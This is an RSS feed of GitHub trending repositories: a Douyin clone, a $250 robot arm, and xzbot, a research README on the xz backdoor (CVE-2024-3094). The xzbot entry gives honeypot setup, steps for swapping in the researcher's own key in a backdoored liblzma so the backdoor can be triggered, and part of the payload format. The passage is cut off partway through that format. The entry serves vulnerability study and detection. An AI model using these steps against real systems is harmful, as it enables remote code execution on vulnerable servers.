<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub All Languages Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2024-04-04T01:24:17Z</updated>
  <subtitle>Daily Trending of All Languages in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>zyronon/douyin</title>
    <updated>2024-04-04T01:24:17Z</updated>
    <id>tag:github.com,2024-04-04:/zyronon/douyin</id>
    <link href="https://github.com/zyronon/douyin" rel="alternate"></link>
    <summary type="html">&lt;p&gt;TikTok 抖音 Vue.js&lt;/p&gt;&lt;hr&gt;&lt;h1 align=&#34;center&#34;&gt; Douyin &lt;/h1&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://raw.githubusercontent.com/zyronon/douyin/master/README.md&#34;&gt;简体中文&lt;/a&gt; | &lt;a href=&#34;https://raw.githubusercontent.com/zyronon/douyin/master/README-en-US.md&#34;&gt;English&lt;/a&gt; &lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;douyin&lt;/code&gt; 是一个模仿抖音的移动端短视频项目，它基于 &lt;a href=&#34;https://cn.vuejs.org/&#34;&gt;&lt;code&gt;Vue&lt;/code&gt;&lt;/a&gt;、&lt;a href=&#34;https://cn.vitejs.dev/&#34;&gt;&lt;code&gt;Vite&lt;/code&gt;&lt;/a&gt; 实现。使用了最新的 &lt;code&gt;Vue&lt;/code&gt; 全家桶技术栈，接口数据通过 &lt;a href=&#34;https://github.com/ctimmerm/axios-mock-adapter&#34;&gt;&lt;code&gt;axios-mock-adapter&lt;/code&gt;&lt;/a&gt; 模拟&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;分享我其他开源项目：&lt;/p&gt; &#xA; &lt;p&gt;&lt;em&gt;&lt;a href=&#34;https://github.com/zyronon/typing-word&#34;&gt;&lt;strong&gt;Typing Word&lt;/strong&gt; - 可在网页上使用的背单词软件~&lt;/a&gt; &lt;img src=&#34;https://img.shields.io/github/stars/zyronon/typing-word.svg?style=flat-square&amp;amp;label=Star&amp;amp;color=4285dd&amp;amp;logo=github&#34; height=&#34;16px&#34;&gt;&lt;/em&gt;&lt;br&gt; &lt;em&gt;&lt;a href=&#34;https://github.com/zyronon/web-scripts&#34;&gt;&lt;strong&gt;Web Scripts&lt;/strong&gt; - 一些好用的油猴脚本~&lt;/a&gt; &lt;img src=&#34;https://img.shields.io/github/stars/zyronon/web-scripts.svg?style=flat-square&amp;amp;label=Star&amp;amp;color=4285dd&amp;amp;logo=github&#34; height=&#34;16px&#34;&gt;&lt;/em&gt;&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h2&gt;免责声明&lt;/h2&gt; &#xA;&lt;p&gt;本项目仅适用于技术研究和分享，不得用于商业使用&lt;/p&gt; &#xA;&lt;h2&gt;在线访问&lt;/h2&gt; &#xA;&lt;p&gt;Vercel： &lt;a href=&#34;http://dy.ttentau.top/&#34;&gt;http://dy.ttentau.top/&lt;/a&gt; (国内推荐访问这个)&lt;/p&gt; &#xA;&lt;p&gt;Netlify：&lt;a href=&#34;https://douyins.netlify.app/&#34;&gt;https://douyins.netlify.app/&lt;/a&gt; (需要翻墙)&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;：&lt;code&gt;PC&lt;/code&gt; 浏览器请用手机模式访问。先按 &lt;code&gt;F12&lt;/code&gt; 调出控制台，再按 &lt;code&gt;Ctrl+Shift+M&lt;/code&gt; 切换到手机模式&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;：手机请用 &lt;a href=&#34;https://viayoo.com/zh-cn/&#34;&gt;Via 浏览器&lt;/a&gt; 或者 Chrome 浏览器预览。其它浏览器会强制将视频全屏，导致样式失效&lt;/p&gt; &#xA;&lt;h2&gt;效果截图&lt;/h2&gt; &#xA;&lt;div&gt; &#xA; &lt;img width=&#34;150px&#34; src=&#34;https://raw.githubusercontent.com/zyronon/douyin/master/public/docs/1.gif&#34;&gt; &#xA; &lt;img width=&#34;150px&#34; src=&#34;https://raw.githubusercontent.com/zyronon/douyin/master/public/docs/2.gif&#34;&gt; &#xA; &lt;img width=&#34;150px&#34; src=&#34;https://raw.githubusercontent.com/zyronon/douyin/master/public/docs/3.gif&#34;&gt; &#xA; &lt;img width=&#34;150px&#34; src=&#34;https://raw.githubusercontent.com/zyronon/douyin/master/public/docs/4.gif&#34;&gt; &#xA; &lt;img width=&#34;150px&#34; src=&#34;https://raw.githubusercontent.com/zyronon/douyin/master/public/docs/5.gif&#34;&gt; &#xA; &lt;img width=&#34;150px&#34; src=&#34;https://raw.githubusercontent.com/zyronon/douyin/master/public/docs/img-1.jpg&#34;&gt; &#xA; &lt;img width=&#34;150px&#34; src=&#34;https://raw.githubusercontent.com/zyronon/douyin/master/public/docs/img-2.jpg&#34;&gt; &#xA; &lt;img width=&#34;150px&#34; src=&#34;https://raw.githubusercontent.com/zyronon/douyin/master/public/docs/img-3.jpg&#34;&gt; &#xA; &lt;img width=&#34;150px&#34; src=&#34;https://raw.githubusercontent.com/zyronon/douyin/master/public/docs/img-4.jpg&#34;&gt; &#xA; &lt;img width=&#34;150px&#34; src=&#34;https://raw.githubusercontent.com/zyronon/douyin/master/public/docs/img-5.jpg&#34;&gt; &#xA;&lt;/div&gt; &#xA;&lt;h2&gt;相关帖子&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;掘金：&lt;a href=&#34;https://juejin.cn/post/7352813352051687458&#34;&gt;https://juejin.cn/post/7352813352051687458&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;V2EX：&lt;a href=&#34;https://www.v2ex.com/t/1028678#reply116&#34;&gt;https://www.v2ex.com/t/1028678#reply116&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;项目所展示的网红&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;我是香秀 🐂🍺： &lt;a href=&#34;https://v.douyin.com/iYRAPA2L/&#34;&gt;https://v.douyin.com/iYRAPA2L/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;杨老虎 🐯（磕穿下巴掉牙版）： &lt;a href=&#34;https://v.douyin.com/iYRA56de/&#34;&gt;https://v.douyin.com/iYRA56de/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;条子： &lt;a href=&#34;https://v.douyin.com/iYRAaqjr/&#34;&gt;https://v.douyin.com/iYRAaqjr/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;达莎 Digi：&lt;a href=&#34;https://v.douyin.com/iYRA6rwT/&#34;&gt;https://v.douyin.com/iYRA6rwT/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;小橙子： &lt;a href=&#34;https://v.douyin.com/iYRAnudw/&#34;&gt;https://v.douyin.com/iYRAnudw/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;南恬： &lt;a href=&#34;https://v.douyin.com/iYRAbKm3/&#34;&gt;https://v.douyin.com/iYRAbKm3/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;小霸宠牛排 🥩：&lt;a href=&#34;https://v.douyin.com/iYRSosVB/&#34;&gt;https://v.douyin.com/iYRSosVB/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;奶茶妹 ◕🌱： &lt;a href=&#34;https://v.douyin.com/iYRACKhP/&#34;&gt;https://v.douyin.com/iYRACKhP/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;我才是岚岚： &lt;a href=&#34;https://v.douyin.com/iYRAQM1C/&#34;&gt;https://v.douyin.com/iYRAQM1C/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;周憬艺 ziran： &lt;a href=&#34;https://v.douyin.com/iYRAQs4h/&#34;&gt;https://v.douyin.com/iYRAQs4h/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;刘思瑶 nice： &lt;a href=&#34;https://v.douyin.com/iYRAaERn/&#34;&gt;https://v.douyin.com/iYRAaERn/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;彭十六 elf： &lt;a href=&#34;https://v.douyin.com/iYRAHrVG/&#34;&gt;https://v.douyin.com/iYRAHrVG/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;李子柒：&lt;a href=&#34;https://v.douyin.com/iYRA5B88/&#34;&gt;https://v.douyin.com/iYRA5B88/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;运行项目&lt;/h2&gt; &#xA;&lt;p&gt;本项目是基于 &lt;code&gt;Vue&lt;/code&gt; 开发的，需要 &lt;code&gt;node&lt;/code&gt; 环境来运行。&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;安装 &lt;code&gt;NodeJS&lt;/code&gt;，参考&lt;a href=&#34;https://nodejs.org/en/download&#34;&gt;官方文档&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;安装 &lt;code&gt;pnpm&lt;/code&gt; 包管理工具，运行 &lt;code&gt;npm install -g pnpm&lt;/code&gt; 来安装&lt;/li&gt; &#xA; &lt;li&gt;使用 &lt;code&gt;git clone https://github.com/zyronon/douyin.git&lt;/code&gt; 下载项目到本地&lt;/li&gt; &#xA; &lt;li&gt;进入项目目录&lt;code&gt;cd douyin&lt;/code&gt;，在项目根目录下，运行&lt;code&gt;pnpm install&lt;/code&gt;来下载依赖。&lt;/li&gt; &#xA; &lt;li&gt;执行&lt;code&gt;pnpm dev&lt;/code&gt;来启动项目，项目默认地址为&lt;a href=&#34;http://localhost:3000&#34;&gt;&lt;code&gt;http://localhost:3000&lt;/code&gt;&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;在浏览器中打开&lt;a href=&#34;http://localhost:3000&#34;&gt;&lt;code&gt;http://localhost:3000&lt;/code&gt;&lt;/a&gt; 来访问项目。 &lt;code&gt;Chrome&lt;/code&gt; 切换成手机模式快捷键，先按 &lt;code&gt;F12&lt;/code&gt; 调出控制台，再按 &lt;code&gt;Ctrl+Shift+M&lt;/code&gt;（设备仿真模拟）&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;功能与建议&lt;/h2&gt; &#xA;&lt;p&gt;目前项目处于开发初期，新功能正在持续添加中，如果你对软件有任何功能与建议，欢迎在 &lt;code&gt;Issues&lt;/code&gt; 中提出 如果你也喜欢本软件的设计思想，欢迎提交 &lt;code&gt;PR&lt;/code&gt;，非常感谢你对我们的支持！&lt;/p&gt; &#xA;&lt;h2&gt;联系我&lt;/h2&gt; &#xA;&lt;p&gt;您可以联系我的邮箱 &lt;a href=&#34;mailto:zyronon@163.com&#34;&gt;&lt;/a&gt;&lt;a href=&#34;mailto:zyronon@163.com&#34;&gt;zyronon@163.com&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;许可协议&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://raw.githubusercontent.com/zyronon/douyin/master/LICENSE&#34;&gt;MIT&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>AlexanderKoch-Koch/low_cost_robot</title>
    <updated>2024-04-04T01:24:17Z</updated>
    <id>tag:github.com,2024-04-04:/AlexanderKoch-Koch/low_cost_robot</id>
    <link href="https://github.com/AlexanderKoch-Koch/low_cost_robot" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;$250 Robot Arm&lt;/h1&gt; &#xA;&lt;p&gt;This repository contains the files to build and control a low-cost robot arm that costs about $250. You can also build a second robot arm (the leader arm) to control the other arm (the follower arm). The design of the leader is inspired by the &lt;a href=&#34;https://github.com/wuphilipp/gello_mechanical&#34;&gt;GELLO project&lt;/a&gt; but is simpler to build. Such a robot arm is well suited for robot learning (e.g. &lt;a href=&#34;https://x.com/alexkoch_ai/status/1756500716854841835?s=20&#34;&gt;https://x.com/alexkoch_ai/status/1756500716854841835?s=20&lt;/a&gt;). Two of those arms are also capable of folding clothes (&lt;a href=&#34;https://x.com/alexkoch_ai/status/1772750496174149708?s=20&#34;&gt;https://x.com/alexkoch_ai/status/1772750496174149708?s=20&lt;/a&gt;).&lt;/p&gt; &#xA;&lt;p&gt;This robot arm uses Dynamixel XL430 and Dynamixel XL330 servo motors. The XL430 motors are almost twice as strong and are used for the first two joints. The XL330 motors are weaker but weigh only 18g each. This makes the arm very lightweight and fast. Dynamixel sells the U2D2 adapter to connect the servos to a computer. However, this is very expensive and the latency is very high. This build uses another cheaper adapter board instead. The robot arm can be controlled with the Dynamixel SDK: &lt;code&gt;pip install dynamixel-sdk&lt;/code&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/AlexanderKoch-Koch/low_cost_robot/main/pictures/robot_portait.jpg&#34; alt=&#34;Robot Arm&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Follower Arm&lt;/h2&gt; &#xA;&lt;h3&gt;Required Materials&lt;/h3&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Part&lt;/th&gt; &#xA;   &lt;th&gt;Cost&lt;/th&gt; &#xA;   &lt;th&gt;Buying link&lt;/th&gt; &#xA;   &lt;th&gt;Specs&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;2x Dynamixel xl430-w250&lt;/td&gt; &#xA;   &lt;td&gt;$100&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.robotis.us/dynamixel-xl430-w250-t/&#34;&gt;https://www.robotis.us/dynamixel-xl430-w250-t/&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://emanual.robotis.com/docs/en/dxl/x/xl430-w250/&#34;&gt;https://emanual.robotis.com/docs/en/dxl/x/xl430-w250/&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;4x Dynamixel xl330-m288&lt;/td&gt; &#xA;   &lt;td&gt;$96&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.robotis.us/dynamixel-xl330-m288-t/&#34;&gt;https://www.robotis.us/dynamixel-xl330-m288-t/&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://emanual.robotis.com/docs/en/dxl/x/xl330-m288/&#34;&gt;https://emanual.robotis.com/docs/en/dxl/x/xl330-m288/&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;XL330 Idler Wheel&lt;/td&gt; &#xA;   &lt;td&gt;$10&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.robotis.us/fpx330-h101-4pcs-set/&#34;&gt;https://www.robotis.us/fpx330-h101-4pcs-set/&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;XL430 Idler Wheel&lt;/td&gt; &#xA;   &lt;td&gt;$7&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.robotis.us/hn11-i101-set/&#34;&gt;https://www.robotis.us/hn11-i101-set/&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Serial bus servo driver board&lt;/td&gt; &#xA;   &lt;td&gt;$10&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://a.co/d/7C3RUYU&#34;&gt;https://a.co/d/7C3RUYU&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Voltage Reducer&lt;/td&gt; &#xA;   &lt;td&gt;$4&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://a.co/d/iWJlp6A&#34;&gt;https://a.co/d/iWJlp6A&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;12V Power Supply&lt;/td&gt; &#xA;   &lt;td&gt;$12&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://a.co/d/40o8uMN&#34;&gt;https://a.co/d/40o8uMN&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Table Clamp&lt;/td&gt; &#xA;   &lt;td&gt;$6&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://a.co/d/4KEiYdV&#34;&gt;https://a.co/d/4KEiYdV&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Wires&lt;/td&gt; &#xA;   &lt;td&gt;$7&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://a.co/d/hQfk2cb&#34;&gt;https://a.co/d/hQfk2cb&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;There is usually a 10% discount code for the robotis shop. It might also help to add some grip tape to the gripper (e.g. &lt;a href=&#34;https://a.co/d/dW7BnEN&#34;&gt;https://a.co/d/dW7BnEN&lt;/a&gt;). A USB-C cable is necessary to connect the servo driver board to a computer. &lt;img src=&#34;https://raw.githubusercontent.com/AlexanderKoch-Koch/low_cost_robot/main/pictures/follower_arm.png&#34; alt=&#34;follower&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Assembly&lt;/h2&gt; &#xA;&lt;p&gt;Video of the assembly: &lt;a href=&#34;https://youtu.be/RckrXOEoWrk&#34;&gt;https://youtu.be/RckrXOEoWrk&lt;/a&gt;&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Print all parts with a 3D printer. The STL files are in hardware/follower/stl. The parts are designed to be easy to print. Only the moving part of the gripper needs supports.&lt;/li&gt; &#xA; &lt;li&gt;Assemble the arm without the base. Make sure that the servos are fixed in the same position as in the CAD. The servo horn should be in the default position when screwed in.&lt;/li&gt; &#xA; &lt;li&gt;Solder wires onto voltage reducer. Input should be connected to female connectors and the output to male connectors.&lt;/li&gt; &#xA; &lt;li&gt;Screw the voltage reducer and the servo driver board onto the base&lt;/li&gt; &#xA; &lt;li&gt;Screw the base onto the arm&lt;/li&gt; &#xA; &lt;li&gt;Connect D, V, and G ports on the driver board to the shoulder rotation servo&lt;/li&gt; &#xA; &lt;li&gt;Connect the shoulder rotation servo to the shoulder lift servo&lt;/li&gt; &#xA; &lt;li&gt;Connect the input for the voltage reducer to V and G ports on the driver board&lt;/li&gt; &#xA; &lt;li&gt;Connect the output of the voltage reducer and the remaining D port of the driver board to the elbow servo&lt;/li&gt; &#xA; &lt;li&gt;Connect the driver board to the power supply&lt;/li&gt; &#xA; &lt;li&gt;Connect the driver board to a computer (should work with Linux and macOS)&lt;/li&gt; &#xA; &lt;li&gt;Figure out the device name (e.g. /dev/tty.usbmodem57380045631) &lt;code&gt;ls /dev/tty.*&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Scan the device with &lt;a href=&#34;https://emanual.robotis.com/docs/en/software/dynamixel/dynamixel_wizard2/&#34;&gt;Dynamixel Wizard&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Connect to an XL330 servo and view the input voltage. Adjust the screw on the voltage reducer until the input voltage is 5V.&lt;/li&gt; &#xA; &lt;li&gt;Set the servo ids to 1 for the shoulder to 5 for the gripper servo&lt;/li&gt; &#xA; &lt;li&gt;Set the baudrate to 1M for all servos.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;Leader Arm&lt;/h2&gt; &#xA;&lt;h3&gt;Required Materials&lt;/h3&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Part&lt;/th&gt; &#xA;   &lt;th&gt;Cost&lt;/th&gt; &#xA;   &lt;th&gt;Buying link&lt;/th&gt; &#xA;   &lt;th&gt;Specs&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;6x Dynamixel xl330-w077&lt;/td&gt; &#xA;   &lt;td&gt;$144&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.robotis.us/dynamixel-xl330-m077-t/&#34;&gt;https://www.robotis.us/dynamixel-xl330-m077-t/&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://emanual.robotis.com/docs/en/dxl/x/xl330-m077/&#34;&gt;https://emanual.robotis.com/docs/en/dxl/x/xl330-m077/&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Serial bus servo driver board&lt;/td&gt; &#xA;   &lt;td&gt;$10&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://a.co/d/7C3RUYU&#34;&gt;https://a.co/d/7C3RUYU&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;5v Power Supply&lt;/td&gt; &#xA;   &lt;td&gt;$6&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://a.co/d/5u90NVp&#34;&gt;https://a.co/d/5u90NVp&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Table Clamp&lt;/td&gt; &#xA;   &lt;td&gt;$6&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://a.co/d/4KEiYdV&#34;&gt;https://a.co/d/4KEiYdV&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;XL330 Frame&lt;/td&gt; &#xA;   &lt;td&gt;$7&lt;/td&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://www.robotis.us/fpx330-s101-4pcs-set/&#34;&gt;https://www.robotis.us/fpx330-s101-4pcs-set/&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/AlexanderKoch-Koch/low_cost_robot/main/pictures/leader_arm.png&#34; alt=&#34;leader&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;The assembly of the leader arm is simpler since all motors use 5v. The gripper is replace by a handle and a trigger. During use, a small torque can be applied to the trigger so that it opens by default. The GELLO design uses a spring for this purpose but it is much more difficult to assemble. The teleoperation.py script can be used to test the arms. However, the device names might have to be adjusted.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>amlweems/xzbot</title>
    <updated>2024-04-04T01:24:17Z</updated>
    <id>tag:github.com,2024-04-04:/amlweems/xzbot</id>
    <link href="https://github.com/amlweems/xzbot" rel="alternate"></link>
    <summary type="html">&lt;p&gt;notes, honeypot, and exploit demo for the xz backdoor (CVE-2024-3094)&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;xzbot&lt;/h1&gt; &#xA;&lt;p&gt;Exploration of the xz &lt;a href=&#34;https://www.openwall.com/lists/oss-security/2024/03/29/4&#34;&gt;backdoor&lt;/a&gt; (CVE-2024-3094). Includes the following:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/amlweems/xzbot/main/#honeypot&#34;&gt;honeypot&lt;/a&gt;: fake vulnerable server to detect exploit attempts&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/amlweems/xzbot/main/#ed448-patch&#34;&gt;ed448 patch&lt;/a&gt;: patch liblzma.so to use our own ED448 public key&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/amlweems/xzbot/main/#backdoor-format&#34;&gt;backdoor format&lt;/a&gt;: format of the backdoor payload&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/amlweems/xzbot/main/#backdoor-demo&#34;&gt;backdoor demo&lt;/a&gt;: cli to trigger the RCE assuming knowledge of the ED448 private key&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/amlweems/xzbot/main/assets/demo.png&#34; alt=&#34;xzbot demo&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;honeypot&lt;/h2&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://raw.githubusercontent.com/amlweems/xzbot/main/openssh.patch&#34;&gt;openssh.patch&lt;/a&gt; for a simple patch to openssh that logs any connection attempt with a public key N matching the backdoor format.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ git clone https://github.com/openssh/openssh-portable&#xA;$ patch -p1 &amp;lt; ~/path/to/openssh.patch&#xA;$ autoreconf&#xA;$ ./configure&#xA;$ make&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Any connection attempt will appear as follows in sshd logs:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ journalctl -u ssh-xzbot --since=&#39;1d ago&#39; | grep xzbot:&#xA;Mar 30 00:00:00 honeypot sshd-xzbot[1234]: xzbot: magic 1 [preauth]&#xA;Mar 30 00:00:00 honeypot sshd-xzbot[1234]: xzbot: 010000000100000000000000000000005725B22ED2...&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h1&gt;ed448 patch&lt;/h1&gt; &#xA;&lt;p&gt;The backdoor uses a hardcoded ED448 public key for signature validation and decrypting the payload. If we replace this key with our own, we can trigger the backdoor.&lt;/p&gt; &#xA;&lt;p&gt;The attacker&#39;s ED448 key is:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;0a 31 fd 3b 2f 1f c6 92 92 68 32 52 c8 c1 ac 28&#xA;34 d1 f2 c9 75 c4 76 5e b1 f6 88 58 88 93 3e 48&#xA;10 0c b0 6c 3a be 14 ee 89 55 d2 45 00 c7 7f 6e&#xA;20 d3 2c 60 2b 2c 6d 31 00&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;We will replace this key with our own (generated with seed=0):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;5b 3a fe 03 87 8a 49 b2 82 32 d4 f1 a4 42 ae bd&#xA;e1 09 f8 07 ac ef 7d fd 9a 7f 65 b9 62 fe 52 d6&#xA;54 73 12 ca ce cf f0 43 37 50 8f 9d 25 29 a8 f1&#xA;66 91 69 b2 1c 32 c4 80 00&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;To start, download a backdoored libxzma shared object, e.g. from &lt;a href=&#34;https://snapshot.debian.org/package/xz-utils/5.6.1-1&#34;&gt;https://snapshot.debian.org/package/xz-utils/5.6.1-1&lt;/a&gt;. Then run the patch script. See &lt;a href=&#34;https://raw.githubusercontent.com/amlweems/xzbot/main/assets/&#34;&gt;assets/&lt;/a&gt; for examples.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ pip install pwntools&#xA;$ shasum -a 256 liblzma.so.5.6.1&#xA;605861f833fc181c7cdcabd5577ddb8989bea332648a8f498b4eef89b8f85ad4  liblzma.so.5.6.1&#xA;$ python3 patch.py liblzma.so.5.6.1&#xA;Patching func at offset: 0x24470&#xA;Generated patched so: liblzma.so.5.6.1.patch&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Then run sshd using this modified &lt;code&gt;liblzma.so.5.6.1.patch&lt;/code&gt; shared object.&lt;/p&gt; &#xA;&lt;h2&gt;backdoor format&lt;/h2&gt; &#xA;&lt;p&gt;The backdoor can be triggered by connecting with an SSH certificate with a payload in the CA signing key N value. This payload must be encrypted and signed with the attacker&#39;s ED448 key.&lt;/p&gt; &#xA;&lt;p&gt;The structure has the following format:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&#xA;|   a (32 bit)  |   b (32 bit)  |           c (64 bit)          |&#xA;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&#xA;|                                                               |&#xA;+                     ciphertext (240 bytes)                    +&#xA;|                                                               |&#xA;+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;A request type is derived from the three values above 